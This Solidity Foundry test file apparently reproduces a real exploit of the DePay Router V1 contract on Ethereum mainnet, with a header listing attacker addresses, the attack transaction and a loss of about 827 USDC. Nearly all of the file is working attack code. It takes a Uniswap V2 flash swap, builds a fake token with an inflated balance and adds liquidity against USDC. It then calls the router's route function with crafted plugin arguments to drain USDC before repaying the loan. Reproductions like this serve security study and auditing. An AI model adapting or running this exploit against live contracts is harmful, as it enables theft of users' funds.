// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~827 USDC
// Attacker : https://etherscan.io/address/0x7f284235aef122215c46656163f39212ffa77ed9
// Attack Contract :https://etherscan.io/address/0xba2aa7426ec6529c25a38679478645b2db5fa19b
// Vulnerable Contract : https://etherscan.io/address/0xae60ac8e69414c2dc362d0e6a03af643d1d85b92
// Attack Tx : https://etherscan.io/tx/0x9a036058afb58169bfa91a826f5fcf4c0a376e650960669361d61bef99205f35

// @Analysis
// Twitter Guy : https://twitter.com/CertiKAlert/status/1709764146324009268

interface IDepayRouterV1 {
    function route(
        // The path of the token conversion.
        address[] calldata path,
        // Amounts passed to proccessors:
        // e.g. [amountIn, amountOut, deadline]
        uint256[] calldata amounts,
        // Addresses passed to plugins:
        // e.g. [receiver]
        address[] calldata addresses,
        // List and order of plugins to be executed for this payment:
        // e.g. [Uniswap,paymentPlugin] to swap and pay
        address[] calldata plugins,
        // Data passed to plugins:
        // e.g. ["signatureOfSmartContractFunction(address,uint)"] receiving the payment
        string[] calldata data
    ) external payable returns (bool);
}

contract ContractTest is Test {
    IUSDC USDC = IUSDC(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUniswapV2Pair UNIV2 = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniswapV2Router UniRouter = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IDepayRouterV1 DepayRouter = IDepayRouterV1(0xae60aC8e69414C2Dc362D0e6a03af643d1D85b92);
    IUniswapV2Factory UniFactory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    uint256 amount = 1_755_923_836;
    address DePayUniV1 = 0xe04b08Dfc6CaA0F4Ec523a3Ae283Ece7efE00019;

    function conAddress(address address1, address address2) public pure returns (bytes memory) {
        bytes32 concatenated;
        assembly {
            mstore(concatenated, address1)
            mstore(add(concatenated, 0x14), address2)
        }
        return abi.encodePacked(concatenated);
    }

    function setUp() public {
        vm.createSelectFork("mainnet", 18_281_130 - 1);
        vm.label(address(USDC), "USDC");
        vm.label(address(UNIV2), "UNIV2: USDC");
        vm.label(address(UniRouter), "UniRouter");
        vm.label(address(UniFactory), "UniFactory");
        vm.label(address(DepayRouter), "DepayRouter");
        approveAll();
    }

    function testExploit() external {
        uint256 startUSDC = USDC.balanceOf(address(this));
        console.log("Before Start: %d USDC", startUSDC);
        UNIV2.swap(amount, 0, address(this), conAddress(address(USDC), address(DepayRouter)));

        uint256 intExp = USDC.balanceOf(address(this)) / 1e6;
        uint256 decExp = USDC.balanceOf(address(this)) - intExp * 1e6;
        console.log("Attack Exploit: %s.%s USDC", intExp, decExp);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        uint256 amountAMin = 877_961_918;
        ERC20ops();
        uint256 amountA;
        uint256 amountB;
        uint256 liquidity;
        (amountA, amountB, liquidity) =
            UniRouter.addLiquidity(sender, address(USDC), 1e30, 1, amountAMin, 1, address(this), type(uint256).max);
        IUniswapV2Pair newUniPair = IUniswapV2Pair(UniFactory.getPair(address(this), address(USDC)));

        address[] memory path = new address[](2);
        (path[0], path[1]) = (address(USDC), address(this));
        uint256[] memory amounts = new uint256[](3);
        (amounts[0], amounts[1], amounts[2]) = (amountAMin, 0, type(uint256).max);
        address[] memory addresses = new address[](2);
        (addresses[0], addresses[1]) = (address(this), address(this));
        address[] memory plugins = new address[](2);
        (plugins[0], plugins[1]) = (DePayUniV1, DePayUniV1);
        string[] memory data = new string[](1);
        DepayRouter.route(path, amounts, addresses, plugins, data);

        newUniPair.approve(address(UniRouter), liquidity);
        UniRouter.removeLiquidity(address(this), address(USDC), liquidity, 1, 1, address(this), type(uint256).max);

        USDC.transfer(address(UNIV2), amount * 1001 / 997);
    }

    function approveAll() internal {
        USDC.approve(address(UniRouter), type(uint256).max);
        USDC.approve(address(DepayRouter), type(uint256).max);
    }

    function ERC20ops() internal {
        balances[address(this)] = 1e30 + 1;
    }

    mapping(address => uint256) public balances;

    function balanceOf(address account) public view virtual returns (uint256) {
        return balances[account];
    }

    function transfer(address to, uint256 value) public virtual returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {
        _transfer(from, to, value);
        return true;
    }

    function _transfer(address from, address to, uint256 value) internal {
        balances[from] -= value;
        balances[to] += value;
    }
}
